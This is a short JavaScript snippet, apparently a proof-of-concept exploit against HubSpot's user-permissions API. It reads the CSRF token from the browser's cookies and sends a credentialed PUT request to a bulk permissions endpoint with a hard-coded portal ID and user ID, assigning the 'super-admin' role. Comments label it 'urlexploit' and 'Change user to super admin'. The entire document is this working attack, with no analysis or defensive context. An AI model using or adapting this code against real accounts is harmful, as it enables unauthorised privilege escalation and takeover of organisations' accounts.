async function sendPostRequest(urlexploit, data) {
  try {
    const postResponse = await fetch(urlexploit, {
      method: 'PUT',
      credentials: 'include', // Include cookies in the request
      headers: {
        'Content-Type': 'application/json',
        'X-Hubspot-Csrf-Hubspotapi': document.cookie.split('; ').find(row => row.startsWith('csrf.app=')).split('=').slice(1).join('=')
      },
      body: data
    });
    const result = await postResponse.json(); // If you want to process the response
    console.log(result);
  } catch (error) {
    console.error('Error:', error);
  }
}

// urlexploit
const urlexploit = '/api/app-users/v1/users/permissions-and-seats/bulk?portalId=145163544&clienttimeout=14000&hs_static_app=settings-ui-users&hs_static_app_version=1.43907';
// Change user to super admin
const data = '[{"userId":69507389,"roles":["sequences-write","sales-pro","sequences-bulk-enroll-write","super-admin","core-seat-base"],"seatNames":["core","sales-pro-trial"]}]';
sendPostRequest(urlexploit, data);
